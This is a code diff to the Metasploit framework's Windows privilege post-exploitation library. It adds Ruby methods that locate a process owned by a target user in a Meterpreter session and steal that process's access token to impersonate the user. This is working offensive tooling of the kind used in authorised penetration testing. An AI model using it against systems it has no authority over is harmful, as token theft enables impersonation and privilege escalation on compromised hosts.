@@ -43,6 +43,48 @@ module Msf::Post::Windows::Priv
     end
   end
 
+  # Steals the current user's token.
+  # @see steal_token
+  def steal_current_user_token
+    steal_token(get_env('COMPUTERNAME'), get_env('USERNAME'))
+  end
+
+  #
+  # Steals a token for a user.
+  # @param String computer_name Computer name.
+  # @param String user_name To token to steal from. If not set, it will try to steal
+  #                        the current user's token.
+  # @return [boolean] TrueClass if successful, otherwise FalseClass.
+  # @example steal_token(get_env('COMPUTERNAME'), get_env('USERNAME'))
+  #
+  def steal_token(computer_name, user_name)
+    pid = nil
+
+    session.sys.process.processes.each do |p|
+      if p['user'] == "#{computer_name}\\#{user_name}"
+        pid = p['pid']
+      end
+    end
+
+    unless pid
+      vprint_error("No PID found for #{user_name}")
+      return false
+    end
+
+    vprint_status("Stealing token from PID #{pid} for #{user_name}")
+
+    begin
+      session.sys.config.steal_token(pid)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      # It could raise an exception even when the token is successfully stolen,
+      # so we will just log the exception and move on.
+      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+    end
+
+    true
+  end
+
+
   #
   # Returns true if in the administrator group
   #
